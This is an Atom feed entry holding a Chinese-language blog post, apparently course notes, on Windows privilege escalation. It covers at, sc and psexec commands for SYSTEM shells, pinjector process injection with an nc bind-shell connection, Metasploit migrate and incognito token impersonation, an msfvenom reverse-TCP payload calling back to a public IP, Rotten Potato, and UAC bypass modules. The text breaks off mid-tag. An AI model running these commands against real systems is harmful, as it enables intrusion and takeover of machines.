    <link href="http://example.com/2023/04/17/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2023/04/17/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/</id>
    <published>2023-04-17T02:36:40.000Z</published>
    <updated>2023-04-21T18:14:04.616Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420165400538.png" alt="image-20230420165400538"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、服务配置-AT&amp;SC&amp;PS命令</p><p>2、权限迁移-令牌窃取&amp;进程注入</p><h3 id="截至目前思路点总结如下："><a href="#截至目前思路点总结如下：" class="headerlink" title="#截至目前思路点总结如下："></a>#截至目前思路点总结如下：</h3><p>1.提权方法有部分适用在不同环境，当然也有通用方法</p><p>2.提权方法也有操作系统版本区分，特性决定方法利用面</p><p>3.提权方法有部分需要特定环境，如数据库,第三方提权等</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="只有土豆溢出漏洞才可以web低权限提升为system，其他都需要Administrtor权限"><a href="#只有土豆溢出漏洞才可以web低权限提升为system，其他都需要Administrtor权限" class="headerlink" title="只有土豆溢出漏洞才可以web低权限提升为system，其他都需要Administrtor权限"></a>只有土豆溢出漏洞才可以web低权限提升为system，其他都需要Administrtor权限</h4><h4 id="➢-WIN-本地用户-AT-amp-SC-amp-PS命令"><a href="#➢-WIN-本地用户-AT-amp-SC-amp-PS命令" class="headerlink" title="➢ WIN-本地用户-AT&amp;SC&amp;PS命令"></a>➢ WIN-本地用户-AT&amp;SC&amp;PS命令</h4><h4 id="➢-WIN-本地用户-进程迁移注入获取"><a href="#➢-WIN-本地用户-进程迁移注入获取" class="headerlink" title="➢ WIN-本地用户-进程迁移注入获取"></a>➢ WIN-本地用户-进程迁移注入获取</h4><h4 id="➢-WIN-本地-amp-Web-令牌窃取-amp-土豆溢出"><a href="#➢-WIN-本地-amp-Web-令牌窃取-amp-土豆溢出" class="headerlink" title="➢ WIN-本地&amp;Web-令牌窃取&amp;土豆溢出"></a>➢ WIN-本地&amp;Web-令牌窃取&amp;土豆溢出</h4></blockquote><h3 id="WIN-本地用户-AT-amp-SC-amp-PS命令"><a href="#WIN-本地用户-AT-amp-SC-amp-PS命令" class="headerlink" title="#WIN-本地用户-AT&amp;SC&amp;PS命令"></a>#WIN-本地用户-AT&amp;SC&amp;PS命令</h3><h5 id="1、at命令提权的原理"><a href="#1、at命令提权的原理" class="headerlink" title="1、at命令提权的原理"></a>1、at命令提权的原理</h5><p>at命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用system权限。</p><p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除.</p><p>当我们拿到低权限的用户，通过连接上服务器后，可以通过at命令来进行本地提权。</p><p>提权命令：Test in Win2003</p><p>at 20:18 &#x2F;interactive cmd (在20:33分生成一个交互式的System权限的cmd)</p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420113855865.png" alt="image-20230420113855865"></p><h5 id="2、sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows-7、8、03、08、12、16（win2k3-ok-其他未测基本失败）"><a href="#2、sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows-7、8、03、08、12、16（win2k3-ok-其他未测基本失败）" class="headerlink" title="2、sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows 7、8、03、08、12、16（win2k3 ok 其他未测基本失败）"></a>2、sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows 7、8、03、08、12、16（win2k3 ok 其他未测基本失败）</h5><ul><li><p>提权命令：Test in Win2k3</p></li><li><p>#创建一个名叫syscmd的新的交互式的cmd执行服务</p><p>sc Create syscmd binPath&#x3D; “cmd &#x2F;K start” type&#x3D; own type&#x3D; interact（实战中可以将cmd路径换成网站wehshell路径执行上线）</p></li><li><p>#运行服务</p><p>sc start syscmd</p></li></ul><h5 id="3、适用版本：Test-in-Win2012-and-Win2008-amp-Win2016-其他未测-基本可以"><a href="#3、适用版本：Test-in-Win2012-and-Win2008-amp-Win2016-其他未测-基本可以" class="headerlink" title="3、适用版本：Test in Win2012 and Win2008 &amp; Win2016 其他未测 基本可以"></a>3、适用版本：Test in Win2012 and Win2008 &amp; Win2016 其他未测 基本可以</h5><p>微软官方提权exe文件：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><h6 id="psexec-exe-accepteula-s-i-d-cmd-调用运行cmd"><a href="#psexec-exe-accepteula-s-i-d-cmd-调用运行cmd" class="headerlink" title="psexec.exe -accepteula -s -i -d cmd #调用运行cmd"></a>psexec.exe -accepteula -s -i -d cmd #调用运行cmd</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420114712336.png" alt="image-20230420114712336"></p><h6 id="但是个人主机可能不行，提示没有这个服务，但是服务器主机一般都有这个服务"><a href="#但是个人主机可能不行，提示没有这个服务，但是服务器主机一般都有这个服务" class="headerlink" title="但是个人主机可能不行，提示没有这个服务，但是服务器主机一般都有这个服务"></a>但是个人主机可能不行，提示没有这个服务，但是服务器主机一般都有这个服务</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420115028314.png" alt="image-20230420115028314"></p><h3 id="WIN-本地用户-进程迁移注入获取"><a href="#WIN-本地用户-进程迁移注入获取" class="headerlink" title="#WIN-本地用户-进程迁移注入获取"></a>#WIN-本地用户-进程迁移注入获取</h3><h6 id="相当于开了一后门，注入到其他用户进程下！"><a href="#相当于开了一后门，注入到其他用户进程下！" class="headerlink" title="相当于开了一后门，注入到其他用户进程下！"></a>相当于开了一后门，注入到其他用户进程下！</h6><h5 id="1、Win2008以前版本-Test-in-Win2k3-本地权限-本地虚拟机"><a href="#1、Win2008以前版本-Test-in-Win2k3-本地权限-本地虚拟机" class="headerlink" title="1、Win2008以前版本 -Test in Win2k3-本地权限-本地虚拟机"></a>1、Win2008以前版本 -Test in Win2k3-本地权限-本地虚拟机</h5><ul><li><h6 id="pinjector-l"><a href="#pinjector-l" class="headerlink" title="pinjector -l"></a>pinjector -l</h6></li></ul><h6 id="相当于在进程里面加一个线程，享用当前权限"><a href="#相当于在进程里面加一个线程，享用当前权限" class="headerlink" title="相当于在进程里面加一个线程，享用当前权限"></a>相当于在进程里面加一个线程，享用当前权限</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420141423244.png" alt="image-20230420141423244"></p><ul><li><h6 id="pinjector-p-420-cmd-3333"><a href="#pinjector-p-420-cmd-3333" class="headerlink" title="pinjector -p 420 cmd 3333"></a>pinjector -p 420 cmd 3333</h6></li></ul><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420141338440.png" alt="image-20230420141338440"></p><ul><li><h6 id="nc-192-168-46-149-3333"><a href="#nc-192-168-46-149-3333" class="headerlink" title="nc 192.168.46.149 3333"></a>nc 192.168.46.149 3333</h6></li></ul><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420141206943.png" alt="image-20230420141206943"></p><h5 id="2、MSF进程注入-本地权限-Win2008-amp-2012-amp-2016-阿里云服务器"><a href="#2、MSF进程注入-本地权限-Win2008-amp-2012-amp-2016-阿里云服务器" class="headerlink" title="2、MSF进程注入 本地权限-Win2008&amp;2012&amp;2016-阿里云服务器"></a>2、MSF进程注入 本地权限-Win2008&amp;2012&amp;2016-阿里云服务器</h5><p>1、msf生成木马执行上线后，查看为administrator权限</p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420141812861.png" alt="image-20230420141812861"></p><p>2、ps &#x2F;&#x2F;查看哪个进程是system权限</p><p>挑选一个system权限的进程</p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420142007501.png" alt="image-20230420142007501"></p><p>3、migrate PID &#x2F;&#x2F;迁移对应PID</p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420142336613.png" alt="image-20230420142336613"></p><h3 id="WIN-本地用户-Web-令牌窃取-amp-土豆（只有土豆才支持web低权限提权system）"><a href="#WIN-本地用户-Web-令牌窃取-amp-土豆（只有土豆才支持web低权限提权system）" class="headerlink" title="#WIN-本地用户-Web-令牌窃取&amp;土豆（只有土豆才支持web低权限提权system）"></a>#WIN-本地用户-Web-令牌窃取&amp;土豆（只有土豆才支持web低权限提权system）</h3><h5 id="令牌窃取-Win2008-Win2012-Win2016-阿里云服务器"><a href="#令牌窃取-Win2008-Win2012-Win2016-阿里云服务器" class="headerlink" title="令牌窃取 Win2008 Win2012 Win2016 阿里云服务器"></a>令牌窃取 Win2008 Win2012 Win2016 阿里云服务器</h5><p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。</p><p>所以当一个攻击者需要域管理员的操作权限时候，需通过假冒域管理员的令牌进行攻击。</p><h5 id="1、本地权限-Test-in-Win2008、12、16-阿里云服务器"><a href="#1、本地权限-Test-in-Win2008、12、16-阿里云服务器" class="headerlink" title="1、本地权限 - Test in Win2008、12、16 阿里云服务器"></a>1、本地权限 - Test in Win2008、12、16 阿里云服务器</h5><p><code>1、msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=3333 -f exe -o msf.exe</code></p><p><code>2、use incognito</code></p><p><code>3、list_tokens -u</code></p><p><code>4、impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></p><h6 id="获得system权限"><a href="#获得system权限" class="headerlink" title="获得system权限"></a>获得system权限</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420143151351.png" alt="image-20230420143151351"></p><h5 id="2、Web权限-Test-in-Win2008-12-16-阿里云服务器-（低权限网站权限需要借助烂土豆令牌窃取漏洞来提升到syste权限）"><a href="#2、Web权限-Test-in-Win2008-12-16-阿里云服务器-（低权限网站权限需要借助烂土豆令牌窃取漏洞来提升到syste权限）" class="headerlink" title="2、Web权限 - Test in Win2008 12 16 阿里云服务器 （低权限网站权限需要借助烂土豆令牌窃取漏洞来提升到syste权限）"></a>2、Web权限 - Test in Win2008 12 16 阿里云服务器 （低权限网站权限需要借助烂土豆令牌窃取漏洞来提升到syste权限）</h5><h6 id="在上传msf-exe获取网站权限后，上传土豆"><a href="#在上传msf-exe获取网站权限后，上传土豆" class="headerlink" title="在上传msf.exe获取网站权限后，上传土豆"></a>在上传msf.exe获取网站权限后，上传土豆</h6><p><code>execute -cH -f ./potato.exe //配合烂土豆</code></p><p><code>use incognito</code></p><p><code>list_tokens -u</code></p><p><code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420144232795.png" alt="image-20230420144232795"></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420144401503.png" alt="image-20230420144401503"></p><ul><li><h5 id="补充点：UAC"><a href="#补充点：UAC" class="headerlink" title="补充点：UAC"></a>补充点：UAC</h5></li></ul><h6 id="铭说-浅析UAC原理及绕过提权-FreeBuf网络安全行业门户"><a href="#铭说-浅析UAC原理及绕过提权-FreeBuf网络安全行业门户" class="headerlink" title="铭说 | 浅析UAC原理及绕过提权 - FreeBuf网络安全行业门户"></a><a href="https://www.freebuf.com/articles/security-management/262884.html">铭说 | 浅析UAC原理及绕过提权 - FreeBuf网络安全行业门户</a></h6><h6 id="在administrtor权限下，msf执行getsystem，会自动化进行提权（自动使用令牌窃取、进程注入等常规方法进行提权）"><a href="#在administrtor权限下，msf执行getsystem，会自动化进行提权（自动使用令牌窃取、进程注入等常规方法进行提权）" class="headerlink" title="在administrtor权限下，msf执行getsystem，会自动化进行提权（自动使用令牌窃取、进程注入等常规方法进行提权）"></a>在administrtor权限下，msf执行getsystem，会自动化进行提权（自动使用令牌窃取、进程注入等常规方法进行提权）</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420144914566.png" alt="image-20230420144914566"></p><h6 id="上面的方法经测试Win2008、12、16都适用，但是在本地win10上执行会失败"><a href="#上面的方法经测试Win2008、12、16都适用，但是在本地win10上执行会失败" class="headerlink" title="上面的方法经测试Win2008、12、16都适用，但是在本地win10上执行会失败"></a>上面的方法经测试Win2008、12、16都适用，但是在本地win10上执行会失败</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420145519708.png" alt="image-20230420145519708"></p><h6 id="是因为电脑上有UAC"><a href="#是因为电脑上有UAC" class="headerlink" title="是因为电脑上有UAC"></a>是因为电脑上有UAC</h6><h6 id="提权-Windows-UAC-提权-CVE-2019-1388-肖洋肖恩、-博客园-cnblogs-com"><a href="#提权-Windows-UAC-提权-CVE-2019-1388-肖洋肖恩、-博客园-cnblogs-com" class="headerlink" title="[提权]Windows UAC 提权(CVE-2019-1388) - 肖洋肖恩、 - 博客园 (cnblogs.com)"></a>[<a href="https://www.cnblogs.com/-mo-/p/12088056.html">提权]Windows UAC 提权(CVE-2019-1388) - 肖洋肖恩、 - 博客园 (cnblogs.com)</a></h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420145450191.png" alt="image-20230420145450191"></p><h6 id="就像这样，打开一个程序前会提示是否打开"><a href="#就像这样，打开一个程序前会提示是否打开" class="headerlink" title="就像这样，打开一个程序前会提示是否打开"></a>就像这样，打开一个程序前会提示是否打开</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420145632849.png" alt="image-20230420145632849"></p><ul><li><h5 id="下面演示win7的（开启UAC）"><a href="#下面演示win7的（开启UAC）" class="headerlink" title="下面演示win7的（开启UAC）"></a>下面演示win7的（开启UAC）</h5></li></ul><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420162855725.png" alt="image-20230420162855725"></p><h6 id="开启一个窗口监听，等待执行msf-exe"><a href="#开启一个窗口监听，等待执行msf-exe" class="headerlink" title="开启一个窗口监听，等待执行msf.exe"></a>开启一个窗口监听，等待执行msf.exe</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420152800989.png" alt="image-20230420152800989"></p><h6 id="如果直接执行getsystem的话，无法得到权限，因为这里WIN7开启了UAC-先设为UCA-1级"><a href="#如果直接执行getsystem的话，无法得到权限，因为这里WIN7开启了UAC-先设为UCA-1级" class="headerlink" title="如果直接执行getsystem的话，无法得到权限，因为这里WIN7开启了UAC,先设为UCA 1级"></a>如果直接执行getsystem的话，无法得到权限，因为这里WIN7开启了UAC,先设为UCA 1级</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420153223912.png" alt="image-20230420153223912"></p><h6 id="在msf上search-uac的bypass模块"><a href="#在msf上search-uac的bypass模块" class="headerlink" title="在msf上search uac的bypass模块"></a>在msf上search uac的bypass模块</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420151617775.png" alt="image-20230420151617775"></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420151946717.png" alt="image-20230420151946717"></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420153410124.png" alt="image-20230420153410124"></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420152955896.png" alt="image-20230420152955896"></p><h6 id="如果设置UAC-2级"><a href="#如果设置UAC-2级" class="headerlink" title="如果设置UAC 2级"></a>如果设置UAC 2级</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420153705257.png" alt="image-20230420153705257"></p><h6 id="还是bypass成功"><a href="#还是bypass成功" class="headerlink" title="还是bypass成功"></a>还是bypass成功</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420153739812.png" alt="image-20230420153739812"></p><h6 id="但是如果设置成最高级别用相同的模块，会提示失败不能bypass-UAC"><a href="#但是如果设置成最高级别用相同的模块，会提示失败不能bypass-UAC" class="headerlink" title="但是如果设置成最高级别用相同的模块，会提示失败不能bypass UAC"></a>但是如果设置成最高级别用相同的模块，会提示失败不能bypass UAC</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420162710524.png" alt="image-20230420162710524"></p><h6 id="这里使用ask触发UAC询问的模块"><a href="#这里使用ask触发UAC询问的模块" class="headerlink" title="这里使用ask触发UAC询问的模块"></a>这里使用ask触发UAC询问的模块</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420163504168.png" alt="image-20230420163504168"></p><h6 id="如果受害机击了”是“的话，输入getsystem将会提升权限为system"><a href="#如果受害机击了”是“的话，输入getsystem将会提升权限为system" class="headerlink" title="如果受害机击了”是“的话，输入getsystem将会提升权限为system"></a>如果受害机击了”是“的话，输入getsystem将会提升权限为system</h6><p><img 